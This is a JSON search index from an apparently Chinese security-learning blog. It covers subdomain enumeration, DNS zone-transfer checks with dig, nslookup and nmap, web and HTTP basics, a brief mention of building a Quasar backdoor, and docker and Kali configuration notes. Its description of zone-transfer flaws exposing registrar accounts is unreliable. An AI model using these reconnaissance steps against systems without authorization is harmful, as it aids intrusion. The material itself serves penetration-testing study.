[{"content":"","date":"2023-01-10","permalink":"/","section":"Documentation","summary":"","title":"Documentation"},{"content":"","date":"2023-01-10","permalink":"/tags/","section":"Tags","summary":"","title":"Tags"},{"content":"","date":"2023-01-10","permalink":"/tags/%E5%AE%89%E5%85%A8/","section":"Tags","summary":"","title":"安全"},{"content":"","date":"2023-01-10","permalink":"/series/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/","section":"Posts","summary":"","title":"网络安全"},{"content":"什么是网络资产？\u003e 什么是网络资产？ # 网络资产是指在网络环境中可以被连接、管理或控制的设备、系统或服务。\n物理设备，如服务器、路由器、交换机、防火墙等，也可以是虚拟设备，如虚拟机、容器等。网络资产可以是公司内部的，也可以是在云环境中的。它们可能会提供某种服务或功能，如网站、应用程序、数据库等，并且可能会暴露在互联网上，可以被其他组织或个人访问。网络资产的安全性对公司的数据安全和网络运行有着重要的影响。\n什么是网络空间测绘？\u003e 什么是网络空间测绘？ # 网络空间测绘是指在网络环境中对网络拓扑、组织结构、网络资产、安全性等信息进行收集和分析的过程。它包括网络扫描、枚举、目录遍历、端口扫描等一系列操作。 网络空间测绘有助于识别网络中存在的安全漏洞、评估网络的攻击面、了解网络组织结构、监控网络的运行状态、预测网络的发展趋势等. 一般来说，网络空间测绘是安全评估和网络管理中的重要步骤。\n测—\u0026gt;资产探测发现能力。\n绘—\u0026gt;资产数据的关联展现能力。\n","date":"2023-01-10","permalink":"/posts/networkmapping/","section":"文章列表","summary":"什么是网络资产？\u003e 什么是网络资产？ # 网络资产是指在网络环境中可以被连接、管理或控制的设备、系统或服务。\n物理设备，如服务器、路由器、交换机、防火墙等，也可以是虚拟设备，如虚拟机、容器等。网络资产可以是公司内部的，也可以是在云环境中的。它们可能会提供某种服务或功能，如网站、应用程序、数据库等，并且可能会暴露在互联网上，可以被其他组织或个人访问。网络资产的安全性对公司的数据安全和网络运行有着重要的影响。\n什么是网络空间测绘？\u003e 什么是网络空间测绘？ # 网络空间测绘是指在网络环境中对网络拓扑、组织结构、网络资产、安全性等信息进行收集和分析的过程。它包括网络扫描、枚举、目录遍历、端口扫描等一系列操作。 网络空间测绘有助于识别网络中存在的安全漏洞、评估网络的攻击面、了解网络组织结构、监控网络的运行状态、预测网络的发展趋势等. 一般来说，网络空间测绘是安全评估和网络管理中的重要步骤。\n测—\u0026gt;资产探测发现能力。\n绘—\u0026gt;资产数据的关联展现能力。","title":"网络空间测绘"},{"content":"","date":"2023-01-10","permalink":"/tags/%E8%B5%84%E4%BA%A7/","section":"Tags","summary":"","title":"资产"},{"content":"","date":"2023-01-10","permalink":"/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/","section":"Tags","summary":"","title":"子域名"},{"content":"为什么需要进行子域名收集？\u003e 为什么需要进行子域名收集？ # 扩大资产范围，增加漏洞发现的概率\n众所周知，一般情况下主站的安全性可能相对较高，而一些不常用的子站或者上线不久的站点，可能安全方面的考虑还没有很周全，可能成为目标系统的脆弱点\n通常情况下，同一组织采用相同应用搭建多个服务的可能性很大，以及补丁的情况也可能大致相同，因此，存在相同漏洞的概率非常大\n子域名收集的方式\u003e 子域名收集的方式 # 子域名收集通常分为两种方式，分别为被动收集和主动收集。\n被动收集是指，在不与目标系统进行交互的情况下，通过第三方进行收集。这种方式有着明显的优势，因为不需要和目标系统进行交互，所以不会对目标系统造成任何影响，更不会触发任何安全产品的告警。\n被动子域名收集的方式：\n信息泄露 搜索引擎 网络空间测绘引擎（网络资产搜索引擎） 证书透明 第三方DNS服务 AS 号码查询 SAN 收集 使用公共数据集 主动收集是指，通过与目标系统进行交互，对子域名进行收集。因为需要和目标系统进行交互，很可能出现高频访问等情况，有触犯安全产品告警的风险。\n主动收集子域名的方式：\n字典枚举 置换扫描 域传送漏洞 DNSSEC 域名缓存侦测技术 被动子域名收集\u003e 被动子域名收集 # 信息泄露\u003e 信息泄露 # corssdomain.xml 跨站策略文件，主要是为web客户端(如Adobe Flash Player等)设置跨域处理数据的权限，里面可能包含部分域名信息。 Github 、Gitee等代码仓库中，可能有相关子域名的信息 抓包分析获取，如一些静态资源的请求、一些APP或者小程序接口、邮件服务器等等 搜索引擎\u003e 搜索引擎 # 常用的搜索引擎有Google和百度，基础的搜索语法：\nsite:*.baidu.com 缺点：一些访问量较小的网址搜不到 网络空间测绘引擎\u003e 网络空间测绘引擎 # 常见的空间测绘引擎：\nShodan Zoomeye Fofa 网络空间测绘 13 字\u0026middot; 0 \u0026middot; 0 资产 安全 证书透明\u003e 证书透明 # 证书透明(Certificate Transparency) 是一种机制，用于验证证书是否被可信的证书颁发机构所颁发，并将所有颁发的证书公开记录在公共日志中，这些日志是由独立第三方维护的。\n子域名收集可以利用证书透明日志中的信息来获取.\n具体做法:\n查询证书透明日志，获取指定域名对应的证书信息。 从证书信息中提取出网站的域名（包括子域名）。 将所有提取出的域名进行去重和排序，得到该域名下的所有子域名。 证书透明提供了一种更加安全可靠的子域名收集方式,因为它是基于证书的机制，可以在发现子域名的同时验证子域名的合法性，从而减少收集错误的子域名或者欺骗性子域名的可能性.\n常用证书透明查询网站\ncensys： https://censys.io/certificates crtsh： https://crt.sh/ spyse： https://spyse.com/search/certificate certspotter： https://sslmate.com/certspotter/api/ entrust： https://www.entrust.com/ct-search/ facebook： https://developers.facebook.com/tools/ct 第三方DNS服务\u003e 第三方DNS服务 # VirusTotal\nVirusTotal 在执行 URL 扫描时会使用一个功能叫做 \u0026ldquo;DNS 复制\u0026rdquo; 来收集和分析网络数据。\nDNS (域名系统)是一种分布式的解析系统,它将域名映射到对应的IP地址。当一个用户访问一个 URL，他的设备需要通过DNS来解析对应的 IP 地址。而DNS复制功能就是利用这个过程来收集所有用户访问 URL 时执行的DNS解析信息。\n这些信息包括 URL，对应的IP地址,DNS服务器等, 最后会存储到 VirusTotal 的数据库中供用户使用. 这些信息可以帮助用户更好的分析和了解URL访问的相关情况，如可疑的URL,域名查询等。\n其他在线DNS工具汇总：\nhttps://decoder.link/ https://searchdns.netcraft.com/ https://dnsdumpster.com/ https://pentest-tools.com/information-gathering/find-subdomains-of-domain https://www.pkey.in/tools-i/search-subdomains https://hackertarget.com/find-dns-host-records/ https://findsubdomains.com/ https://spyse.com/ AS 号码查询\u003e AS 号码查询 # ASN(Autonomous System Number) 是由网络协议路由部门(Internet Assigned Numbers Authority, IANA)分配的标识自治系统的数字。\n自治系统（AS）是由一组网络路由器组成的网络系统。 它们通常由一个运营商或组织管理，并且是由一个或多个路由器组成的。\nASN是唯一的、全局的标识符，用于标识自治系统的身份，主要用于路由和BGP协议中，它用于在路由器之间确定网络间的路由关系。\n使用 ASN 可以帮助收集子域名的方法主要有两种：\n利用 BGP 协议收集子域名: 在 BGP 协议中，路由器之间交换的信息包含了该 ASN 所管辖的 IP 地址段。可以通过分析 BGP 协议信息来发现与该 ASN 相关的子域名。 利用已有的 ASN 数据库收集子域名:有一些第三方的数据库如 Team Cymru，他们提供了将 IP 地址映射到 ASN 信息的服务，可以通过这些数据库来查询与特定 ASN 相关的子域名。 SAN 收集\u003e SAN 收集 # SAN (Subject Alternative Name) 是一种在 X.509 证书中使用的扩展域，用于定义证书拥有者的多个域名。它可以用于在一个证书中为多个域名（包括子域名）提供安全认证。\nSAN证书在构建多域名的网站的时候有重要的作用,这样就不用再申请多个证书,只需要一个证书就可以保证多个域名和子域名的安全连接,这样可以节省成本,提高效率.\n同样的，可以利用SAN证书来收集子域名。可以分析证书上所包含的域名，来获得子域名信息。一般来说，需要使用特殊的工具或者脚本来分析证书中的信息。\n可以使用以下步骤来利用 SAN 证书来收集子域名:\n使用证书颁发机构的查询工具或者第三方的工具来检索指定域名的证书。 从获取的证书信息中提取出证书的 Subject Alternative Name (SAN) 域。 从 SAN 域中提取出包含子域名的信息，去重、排序。 得到的子域名信息可以用于进一步的安全分析和管理。 使用公共数据集\u003e 使用公共数据集 # 利用已有公开的扫描数据集，对子域名信息进行收集。\n通常这些数据集都是比较大，可以使用命令进行快速查找\nwget https://scans.io/data/rapid7/sonar.fdns_v2/20170417-fdns.json.gz cat 20170417-fdns.json.gz | pigz -dc | grep \u0026#34;.Your_Target.org\u0026#34; | jq 主动子域名收集\u003e 主动子域名收集 # 字典枚举（暴力破解）\u003e 字典枚举（暴力破解） # 优点是可以快速发现子域名，无需依赖其他工具和服务；\n缺点是能收集到多少子域，取决于字典的覆盖程度，并且需要大量的带宽和计算资源，还有可能被目标网站的防护机制阻止。\n置换扫描\u003e 置换扫描 # 使用已知域/子域名的排列组合来识别新的子域名，通过对目标域名进行字符置换来生成可能的子域名进行枚举。使得字典有一定的针对性，提高准确率\n比较常用的工具是 altdns\n域传送漏洞\u003e 域传送漏洞 # 域传送漏洞 (Domain Transfers Vulnerabilities) 是一种安全漏洞,允许攻击者获取一个域名注册商的用户帐户的详细信息, 包括联系人信息，账单信息以及域名管理权限.\nDNS区域传输是将DNS数据库或DNS记录从主名称服务器复制到辅助名称服务器的过程。如果DNS服务器没有进行严格的配置，只要收到AXFR请求就进行域传送，便造成了该漏洞。\n域传送漏洞的影响可能包括:\n攻击者可以获取域名注册商账户中的敏感信息，如联系人信息、账单信息等。 攻击者可以获取对域名的管理权限，如修改DNS记录，甚至指向恶意网站等. 攻击者可以篡改域名所有者信息，控制域名以及域名网站的所有权。 请注意，使用域传送漏洞来收集子域名是非法行为，并且有可能会引起法律问题。此外，攻击域名注册商帐户可能会破坏网络的安全性并对其他客户造成影响。 域传送漏洞的即常见验证方式：\nnslookup\u003e nslookup # # 1.nslookup命令进入交互式shell $ nslookup # 2.server命令 参数设定查询将要使用的DNS服务器 $ server xxx.com # 3.如果漏洞存在的话，可以使用ls命令列出所有域名 $ ls # 4.退出 $ exit dig\u003e dig # 在Linux下，可以使用dig命令来发送DNS请求，这里只需要发送axfr类型的DNS请求，如果存在该漏洞，则会返回所有解析记录。\ndig @Target_DNS_Server_IP axfr 查询的域名 dnswalk\u003e dnswalk # 在Kali中已经预装的工具，这里需要注意的是，要使用域名的完整形式，即 .不能省略\ndnswalk your_domain. nmap\u003e nmap # namap 中也有域传送漏洞的检测脚本：\nnmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=Your_domain -p 53 -Pn dns.xxx.yyy.com DNSSEC\u003e DNSSEC # DNSSEC (Domain Name System Security Extensions) 是一种用于增强 DNS 的安全性的扩展机制,通过在 DNS 中使用数字签名来验证 DNS 数据的完整性.\nDNSSEC 主要用于防止 DNS 劫持和缓存污染攻击,保护用户访问网站的安全性.\nDNSSEC 可以用来收集子域名,主要有两种方法:\n使用DNSSEC验证工具: 通过执行DNSSEC验证来验证域名的DNSSEC配置,从而获取域名的子域名. 使用DNS枚举工具: 通过DNS枚举工具来枚举DNSSEC签名的域名中的所有子域名。 使用DNSSEC来收集子域名，能保证所收集的子域名是经过验证的，有保证的准确性。\n常用的工具：\nldns-walk 可以使用 apt-get 安装 apt-get install ldnsutils nsec3walker nsec3map 域名缓存侦测\u003e 域名缓存侦测 # 域名缓存侦测(DNS Cache Snooping) 是一种技术，通过利用DNS缓存来发现被缓存的域名和子域名的技术。\n这种技术通过发送伪造的DNS请求来探测目标域名的缓存,并在缓存中寻找有用的信息。\n一般来说, 域名缓存侦测技术需要两个部分：\n执行DNS请求: 发送一些伪造的DNS请求来探测缓存中的域名和子域名. 解析缓存信息: 解析缓存中所有的DNS记录来获取子域名信息. 域名缓存侦测技术具有较高的收集子域名效率，在短时间内可以发现大量子域名，但它也有一些缺点:\n只能发现已经被缓存的域名和子域名,无法发现新的域名和子域名 在缓存过期或清除后将无法获取到有用的信息 可能会被检测到并被阻止 可能会对目标网络造成较大的流量和负担. 需要注意的是域名缓存侦测技术可能会对目标网络造成压力，需要在使用时谨慎考虑。 自动化工具\u003e 自动化工具 # Aquatone：用于自动收集子域名, 生成漂亮的网站快照\nOneForAll：是一款比较综合的子域名扫描工具，拥有多个模块和接口扫描，收集子域信息很全，包括子域、子域IP、子域常用端口、子域Title、子域Banner、子域状态等。\n支持docker\n中文友好\n","date":"2023-01-10","permalink":"/posts/subdomian/","section":"文章列表","summary":"为什么需要进行子域名收集？\u003e 为什么需要进行子域名收集？ # 扩大资产范围，增加漏洞发现的概率\n众所周知，一般情况下主站的安全性可能相对较高，而一些不常用的子站或者上线不久的站点，可能安全方面的考虑还没有很周全，可能成为目标系统的脆弱点\n通常情况下，同一组织采用相同应用搭建多个服务的可能性很大，以及补丁的情况也可能大致相同，因此，存在相同漏洞的概率非常大\n子域名收集的方式\u003e 子域名收集的方式 # 子域名收集通常分为两种方式，分别为被动收集和主动收集。\n被动收集是指，在不与目标系统进行交互的情况下，通过第三方进行收集。这种方式有着明显的优势，因为不需要和目标系统进行交互，所以不会对目标系统造成任何影响，更不会触发任何安全产品的告警。\n被动子域名收集的方式：\n信息泄露 搜索引擎 网络空间测绘引擎（网络资产搜索引擎） 证书透明 第三方DNS服务 AS 号码查询 SAN 收集 使用公共数据集 主动收集是指，通过与目标系统进行交互，对子域名进行收集。因为需要和目标系统进行交互，很可能出现高频访问等情况，有触犯安全产品告警的风险。\n主动收集子域名的方式：\n字典枚举 置换扫描 域传送漏洞 DNSSEC 域名缓存侦测技术 被动子域名收集\u003e 被动子域名收集 # 信息泄露\u003e 信息泄露 # corssdomain.","title":"子域名收集姿势总结"},{"content":"","date":"2023-01-08","permalink":"/docs/","section":"Docs","summary":"","title":"Docs"},{"content":"概念名词\u003e 概念名词 # 域名\u003e 域名 # 什么是域名\n顶级域名、二级域名和多级域名\n域名发现对安全测试的意义\n旁站攻击 DNS\u003e DNS # 什么是 DNS？\n域名系统（Domain Name System）。它是一个域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用UDP端口53。对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。 本地 HOSTS 与 DNS 的关系？\nHosts在本地将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当我们访问域名时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。 Hosts地址：C:\\Windows\\System32\\drivers\\etc\\hosts CDN 是什么？与 DNS 的关系？\nCDN：是构建在数据网络上的一种分布式的内容分发网。可以提高系统的响应速度，也可以一定程度的拦截/防御攻击。 在攻击的时候，如果找不到源站，那么我们扫描的就是CDN节点中的缓存，是一种阻碍。 常见的 DNS 安全攻击有哪些？\n缓存投毒：它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。 DNS劫持：是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。（针对面较广） 域名劫持：域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。（针对面窄一点） DNS DDOS攻击：通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。 脚本语言\u003e 脚本语言 # 常见的脚本语言类型有哪些？\nasp php aspx jsp javaweb pl py cgi 等 不同脚本类型与安全漏洞的关系？\n不同脚本可能爆发漏洞的可能性有所不同\n不同脚本漏洞的存在点可能不同，因为不同语言的适用范围不同\n后门\u003e 后门 # 什么是后门？\n通常指那些绕过安全性控制而获取对程序或系统访问权的程序方法。\n在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。\n后门在安全测试中的实际意义？\n可以更方便的链接到主机\n在获取到玩主机权限的时候，后门可以充当命令控制台的角色\nWeb\u003e Web # WEB 的组成架构模型？\n网站源码：分脚本类型，分应用方向 操作系统：windows linux 中间件（搭建平台）：apache iis tomcat nginx 等 数据库：access mysql mssql oracle sybase db2 postsql 等 为什么要从 WEB 层面为主为首？\nweb使用的比较广 web网站的漏洞相对较多 web 作为跳板深入到其他资源相对容易 WEB 相关安全漏洞\n找漏洞的时候从不同层面来入手\nWEB 源码类对应漏洞：SQL 注入，上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等 WEB 中间件对应漏洞：未授权访问，变量覆盖\u0026hellip; WEB 数据库对应漏洞：弱口令，权限提升\u0026hellip; WEB 系统层对应漏洞：提权，远程代码执行 其他第三方对应漏洞 APP 或 PC 应用结合类 其他\u003e 其他 # APP网站套用\nAPP和网站用的是同一套源码，只是显示效果优化了 进程抓包工具：Wsexplorer\n数据包拓展\u003e 数据包拓展 # 代理、HTTP 与 HTTPS、Request 请求数据包数据格式、Response 返回数据包数据格式\nRequest 数据包格式\u003e Request 数据包格式 # 请求行、请求头、空行、请求数据\n示例数据\nPOST /adduser HTTP/1.1 Host: localhost:8030 Connection: keep-alive Content-Length: 16 Pragma: no-cache Cache-Control: no-cache Origin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: */* Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9 请求行\n请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分割。 例如：GET /index.html HTTP/1.1 HTTP 规划定义了 8 种可能的请求方法： GET：检索 URL 中标识资源的一个简单请求 HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档 POST：服务器接受被写入客户端输出流中的数据的请求 PUT：服务器保存请求数据作为指定 URL 新内容的请求 DELETE：服务器删除 URL 中命令的资源的请求 OPTIONS：关于服务器支持的请求方法信息的请求 TRACE：web 服务器反馈 Http 请求和其头标的请求 CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理 请求头\n由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。 HOST: 主机或域名地址 Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格 式。 User-Agent：是客户浏览器名称 Host：对应网址 URL 中的 Web 名称和端口号。 Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。 connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/1.1 使用 Keep-Alive 为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立 连接 Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载 和服务器相关的用户信息，也可以用来实现会话功能。 Referer ： 表 明 产 生 请 求 的 网 页 URL 。 如 比 从 网 页 /icconcept/index.jsp 中 点 击 一 个 链 接 到 网 页 /icwork/search ， 在 向 服 务 器 发 送 的 GET/icwork/search 中 的 请 求 中 ， Referer 是 http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪 Web 请求是从什么网站来的。 Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。 Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1. Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加 速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。 空行\n最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。 请求数据\n使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。 Response 数据包格式\u003e Response 数据包格式 # 一个响应由四个部分组成；状态行、响应头标、空行、响应数据。\n状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔 响应头标：包含服务器类型、日期、长度、内容类型等 空行：响应头与响应体之间用空行隔开 响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面 HTTP 响应码：\n1xx：信息，请求收到，继续处理 2xx：成功，行为被成功地接受、理解和采纳 3xx：重定向，为了完成请求，必须进一步执行的动作 4xx：客户端错误 5xx：服务器错 搭建安全拓展\u003e 搭建安全拓展 # 基于域名和IP扫描目录的不同\n域名和IP地址都可以访问网站，但是有的时候两者指向的目录不同，通常IP指向的目录是域名的上一级，因此我们在扫描网站的敏感文件时，借助IP扫描会得到更多的信息。\n维护人员可能会将网站源码备份，然后放在上级目录，此时IP扫描就有可以扫到备份的源码。\nweb源码中有什么敏感文件？\n后台路径、数据库配置文件、备份文件等\n后缀名解析问题\n不同的后缀名可能会对应相同的解析方式\n也可以自己创建一个后缀名并为其配备相应的解析方式\n基于中间件的简要识别\n可以借助抓包找到网站使用的中间件平台，response数据包\n匿名访问\n如果不启用匿名访问，在访问时就会弹出如下的框\n匿名访问实际上是自动登陆了，以该用户名登陆的都会被赋予相同的权限（来宾权限）\nIP验证、域名验证\n就是一个黑名单和白名单的设置\n后门权限问题\n有些目录（比如：放图片的目录images）没有执行权限，后门上传到该目录是没有用的（连接都连接不上），这时候我们的解决办法就是换目录。\n有可能连接上后门，但是不能写入文件，甚至是不能读取，这是因为访问身份权限不够。\nweb源码拓展\u003e web源码拓展 # 程序源码重要性\n程序源码获取途径\n知名的可以直接搜\n小众的分为合法和非法，两个渠道也有不同\n淘宝、闲鱼、菜鸟源码\n获取源码之后要进行源码审计、漏洞挖掘、漏洞测试\n分析其目录工作原理（数据库备份，bak 文件等）\n分析其目录工作原理（数据库备份，bak 文件等）\n不同语言产生的漏洞类型参考： 5.1.2. 反序列化 — Web安全学习笔记 1.0 文档 (websec.readthedocs.io)\nCMS识别技术\nCMS识别技术是指识别网站使用的内容管理系统（CMS）的技术。这种技术通常用于网络安全，网络渗透测试和网站挖掘等领域。\nCMS识别技术主要通过分析网站的源代码、HTTP头、页面元素、链接等信息来识别网站使用的CMS。有些CMS识别工具还可以通过扫描文件和目录结构来识别CMS。\n一些常见的CMS识别工具包括：\nWappalyzer：一款浏览器扩展，可以识别网站使用的技术，包括CMS等 WhatWeb：一款开源工具，用于识别网站使用的技术，包括CMS等 BuiltWith: 在线服务, 可以识别网站使用的技术, 包括CMS, 应用程序, 插件, 工具等 注意，这些工具可能存在误报或漏报，需要进行人工识别或验证。\n人工识别：找到源码中疑似指纹的文件，用搜索引擎搜一下，可以初步判定是否可以用该文件作为整套源码的指纹。\nCMS字典基本格式\n文件路径|源码名字|MD5值\n编写一个工具代码，对比MD5值可以判定源码\n现成工具和平台识别，面向大众，因此如果自己的目标网站比较小众，最好还是建一个属于自己的字典库。\n演示案例\u003e 演示案例 # 子域名收集\u003e 子域名收集 # 子域名收集姿势总结 355 字\u0026middot; 0 \u0026middot; 0 子域名 安全 exe后门功能及危害\u003e exe后门功能及危害 # Releases · quasar/Quasar (github.com)\n生成.exe后门\n开启端口监听\n远程桌面，因为是127.0.0.1，所以会出现如下图所示的情况\n其他功能\n需要在沙盒或虚拟机中实验！ ","date":"2023-01-08","permalink":"/docs/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","section":"Docs","summary":"概念名词\u003e 概念名词 # 域名\u003e 域名 # 什么是域名\n顶级域名、二级域名和多级域名\n域名发现对安全测试的意义\n旁站攻击 DNS\u003e DNS # 什么是 DNS？\n域名系统（Domain Name System）。它是一个域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用UDP端口53。对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。 本地 HOSTS 与 DNS 的关系？\nHosts在本地将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当我们访问域名时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。 Hosts地址：C:\\Windows\\System32\\drivers\\etc\\hosts CDN 是什么？与 DNS 的关系？\nCDN：是构建在数据网络上的一种分布式的内容分发网。可以提高系统的响应速度，也可以一定程度的拦截/防御攻击。 在攻击的时候，如果找不到源站，那么我们扫描的就是CDN节点中的缓存，是一种阻碍。 常见的 DNS 安全攻击有哪些？","title":"基础入门"},{"content":"","date":"2023-01-08","permalink":"/series/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","section":"Posts","summary":"","title":"小迪安全学习笔记"},{"content":"","date":"2023-01-07","permalink":"/tags/c%5Cc++/","section":"Tags","summary":"","title":"‘C\\C++‘"},{"content":"","date":"2023-01-07","permalink":"/tags/docker/","section":"Tags","summary":"","title":"‘docker’"},{"content":"docker命令\u003e docker命令 # 查看镜像\ndocker image ls\n删除所有镜像\ndocker rmi $(docker images -q)\n查看运行中的容器\ndocker ps\n宿主机和容器间复制文件\n从主机复制到容器sudo docker cp host_path containerID:container_path\n从容器复制到主机sudo docker cp containerID:container_path host_path\n停止并删除容器\ndocker stop \u0026lt;container id|name=``\u0026quot;\u0026quot;``\u0026gt;\u0026lt;/container\u0026gt;\ndocker rm \u0026lt;container id|name=``\u0026quot;\u0026quot;``\u0026gt; \u0026lt;container id|name=``\u0026quot;\u0026quot;``\u0026gt;\u0026lt;/container\u0026gt;\u0026lt;/container\u0026gt;\n进入容器\ndocker exec -it 44fc0f0582d9 /bin/sh\ndocker批量停止或删除容器\nstop停止所有容器\ndocker stop $(docker ps -a -q)\nremove删除所有容器\ndocker rm $(docker ps -a -q)\n将docker容器设为自启动和取消容器自启动\n将正在运行的容器设为自启动 docker update --restart=always \u0026lt;CONTAINER ID\u0026gt;\n将自启动的容器取消自启动 docker update --restart=no \u0026lt;CONTAINER ID\u0026gt;\ndocker update --restart=no $(docker ps -a -q)\ndocker编辑文件\u003e docker编辑文件 # 精简版没有vi也没有vim，那么要怎么编辑文件？\necho abc \u0026gt;\u0026gt; test.txt `` 下载vim 在宿主机编写好文件之后copy到容器中 使用sed命令 Linux sed 命令 | 菜鸟教程 (runoob.com) 重启docker服务\u003e 重启docker服务 # systemctl 方式\u003e systemctl 方式 # 守护进程重启 sudo systemctl daemon-reload 重启docker服务 sudo systemctl restart docker 关闭docker sudo systemctl stop docker\nservice 方式\u003e service 方式 # 重启docker服务 sudo service docker restart 关闭docker sudo service docker stop\n","date":"2023-01-07","permalink":"/docs/docker%E7%9A%84%E4%BD%BF%E7%94%A8/","section":"Docs","summary":"docker命令\u003e docker命令 # 查看镜像\ndocker image ls\n删除所有镜像\ndocker rmi $(docker images -q)\n查看运行中的容器\ndocker ps\n宿主机和容器间复制文件\n从主机复制到容器sudo docker cp host_path containerID:container_path\n从容器复制到主机sudo docker cp containerID:container_path host_path\n停止并删除容器\ndocker stop \u0026lt;container id|name=``\u0026quot;\u0026quot;``\u0026gt;\u0026lt;/container\u0026gt;","title":"docker命令"},{"content":"//方法一 scanf(\u0026#34;%*[^\\n]\u0026#34;);\t//清除回车键以前的所有字符 scanf(\u0026#34;%*c\u0026#34;);\t//清除任意一个字符，这里是回车 //方法二 char c; while ((c = getchar()) != \u0026#39;\\n\u0026#39; \u0026amp;\u0026amp; c != EOF); ","date":"2023-01-07","permalink":"/posts/fflush%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%80%A7%E4%B8%8D%E9%AB%98%E7%94%A8%E4%BB%80%E4%B9%88%E6%9D%A5%E4%BB%A3%E6%9B%BF/","section":"文章列表","summary":"//方法一 scanf(\u0026#34;%*[^\\n]\u0026#34;);\t//清除回车键以前的所有字符 scanf(\u0026#34;%*c\u0026#34;);\t//清除任意一个字符，这里是回车 //方法二 char c; while ((c = getchar()) != \u0026#39;\\n\u0026#39; \u0026amp;\u0026amp; c != EOF); ","title":"Fflush可移植性不高，用什么来代替？"},{"content":"","date":"2023-01-07","permalink":"/tags/kali/","section":"Tags","summary":"","title":"kali"},{"content":"kali linux 环境配置\u003e kali linux 环境配置 # 起源于一次hadoop的安装和环境配置\n因为环境调了很久，具体的细节记不清了，\n一直在几个文件中反复横跳\nvim ~/.local_profile\nvim /etc/profile\nvim ~/.zshrc\nvim ~/.bashrc\nvim /etc/profile.d/my_env.sh\n期间出过一些异常情况：\n重启控制台环境就失效\nxshell下使用普通用户kali运行hadoop可以识别命令，但是同一时间在虚拟机中无法识别命令；\n普通用户可以识别但是root不能识别，或者root能识别但是普通用户不能识别\n重启之后普通用户的JAVA_HOME不见了，但是root的还在\nsource了之后控制台发生变化\n猜测source /etc/profile和source ~/.zshrc 可以改变当前的环境，因此会出现source ~/.zshrc了之后连sudo和vim都找不到\n以上的原因大概就是使用的shell程序不同，对应的环境也不同，那么就应该统一环境\n参考一篇博客，将zsh和bash的环境链接到一个我们自己新建的文件，以后可以在新建的文件里更改环境，两个都能生效。\n创建公共脚本\ntouch ~/.local_profile 在其中写入环境变量\nvim ~/.local_profile\n#HADOOP_HOME export HADOOP_HOME=/opt/module/hadoop-3.2.0 export PATH=$PATH:$HADOOP_HOME/bin export PATH=$PATH:$HADOOP_HOME/sbin # go 仅用于测试 go_bin=\u0026#34;my_env:/home/lemon/software/go/bin\u0026#34; export PATH=$PATH:$go_bin # test test=\u0026#34;my_env:/home/lemon/software/test/bin\u0026#34; export PATH=$PATH:$test 添加bash的引用\nvim ~/.bashrc\n在最后添加\n[[ -f ~/.local_profile ]] \u0026amp;\u0026amp; . ~/.local_profile 添加zsh的引用\nvim ~/.zshrc\n在最后添加\n# Use local customer env if [[ -f ~/.local_profile ]]; then source ~/.local_profile fi 生效终端配置\nsource ~/.zshrc source /etc/profile su kali env | grep test 在虚拟机中env | grep test 结果一样，配置成功\n之所以在虚拟机中测试一遍是因为我怀疑xshell使用的是bash的环境，而kali中是zsh，但是使用echo $SHELL 